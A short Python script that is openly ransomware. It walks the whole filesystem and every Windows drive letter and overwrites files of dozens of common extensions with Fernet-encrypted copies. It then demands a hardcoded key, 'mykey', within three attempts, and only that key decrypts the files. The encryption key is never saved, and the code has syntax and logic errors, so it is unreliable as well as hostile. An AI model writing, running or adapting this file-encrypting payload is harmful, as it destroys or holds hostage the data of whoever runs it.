import os
from cryptography.fernet import Fernet
key = Fernet.generate_key()

ex = {"Extentions":['.xml','.png','.bmp', '.docx', '.exe', '.gif', '.jpg', '.jpeg', '.mdb', '.pdf', '.ppt', '.rtf', '.txt', '.wav', '.xls','.au','.bat','.h','.java','.csv','.cvs','.dbf','.cpp','.dif','.eps','.fm3','.gif','.mp4','.mkv','.3gp','.mp3','m4a', '.web']}

def getAllFileFromDirectory(directory, temp):
  files = os.listdir(directory)
  for file in files:
    try:
      file_bool=True
      for x in ex.Extentions:
        if(file.find(x)!=-1):
          #print(file)
          temp.append(directory+"/"+file)
          #print(directory+"/"+file)
          file_bool=False
          break
      if(file_bool):
        getAllFileFromDirectory(directory+"/"+file, temp)
  except:
    continue
    
def ListOfFiles(Files):
  getAllFileFromDirectory("/", Files)
  for i in range(65,91 ):
    try:
      basePath=chr(i)+":"
      getAllFileFromDirectory(basePath, Files)
    except:
      continue;
      
def Encryption(Files):
  fernet = Fernet(key)
  for i in Files:
  print(i)
  try:
    with open(i,'rb') as f:
      data=f.read()
    encrypted = fernet.encrypt(data)
    with open(i,'wb') as wrt:
      wrt.write(encrypted)
  except:
    continue

def Decryption(Files):
  fernet = Fernet(key)
  for i in Files:
    print(i)
    try:
      with open(i,'rb') as f:
        data=f.read()
      decrypted = fernet.decrypt(data)
      with open(i,'wb') as wrt:
        wrt.write(decrypted)
    except:
      continue
      
Files=[]
ListOfFiles(Files)
Encryption(Files)
os.system('cls')
print("You have Only Three aTtemPts")
x=input("First attempt\nEnter Key: ")
if(x!="mykey"):
  x=input("Second attempt\nEnter Key: ")
  if(x!="mykey"):
    x=input("Last attempt\nEnter Key: ")
if(x=="mykey"):
  Decryption(Files)
  os.system('cls')
